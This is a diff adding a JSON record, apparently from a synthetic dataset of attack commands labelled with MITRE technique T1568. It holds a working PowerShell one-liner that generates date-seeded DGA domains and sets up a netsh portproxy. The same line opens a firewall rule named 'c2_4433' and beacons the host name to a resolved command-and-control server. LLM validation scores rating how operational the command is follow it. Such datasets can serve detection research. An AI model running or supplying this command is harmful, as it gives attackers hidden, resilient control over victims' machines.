@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "$seed='svc';$date=(Get-Date -Format 'yyyyMMdd');$dgad=1..20|%{($seed+$_+$date+'.net')};foreach($d in $dgad){try{$a=Resolve-DnsName -Name $d -Type A -ErrorAction Stop;$ip=($a|Get-Random).IPAddress;netsh interface portproxy delete v4tov4 listenaddress=127.0.0.1 listenport=4433 2>$null;netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=4433 connectaddress=$ip connectport=443;netsh advfirewall firewall add rule name='c2_4433' dir=in action=allow protocol=TCP localport=4433;Invoke-WebRequest -Uri 'http://127.0.0.1:4433/beacon' -UseBasicParsing -Headers @{XNode=$env:COMPUTERNAME;XDom=$d} -TimeoutSec 5;break}catch{}}",
+  "explanation": "Generates a date-seeded DGA domain list, resolves until one returns an A record, then sets a local portproxy to the resolved IP and beacons via the proxy on a non-standard port.",
+  "rationale_steps": [
+    "Create DGA domains tied to current date to enable dynamic rotation.",
+    "Resolve to obtain a current fast-flux IP and configure netsh portproxy for C2 reachability."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-0a23acf2-ea20b44b",
+  "source_prompt_hash": "0a23acf2",
+  "timestamp_utc": "2025-09-30T09:39:46.357850Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced quotes, parentheses, and braces, proper command separators, valid flag formats, and appropriate error handling.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements the T1568 Dynamic Resolution technique by generating date-seeded DGA domains, resolving them, establishing a port proxy to the resolved IP, configuring the firewall, and creating a C2 beacon - all operational steps are correctly implemented.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T05:03:50.386616Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with correct PowerShell syntax, balanced elements, and valid command usage for both PowerShell cmdlets and external `netsh` calls.",
+        "semantic_score": 3,
+        "semantic_justification": "The DGA domain generation and DNS resolution are semantically correct for T1568; however, the `netsh` commands for port proxy and firewall rule creation require Administrator privileges, which contradicts the stated 'Privilege: None', thus preventing the full claimed intent of setting up the proxy and beaconing via it from being achieved.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T05:04:13.347214Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell syntax is well-formed with balanced delimiters, valid cmdlets/arguments, and proper command separators and redirection.",
+        "semantic_score": 3,
+        "semantic_justification": "It correctly performs DGA-style domain generation and resolution aligned with T1568, but creating the portproxy and firewall rule typically requires admin rights so the proxy and subsequent beacon are likely to fail under the stated 'None' privilege.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T05:04:36.861124Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
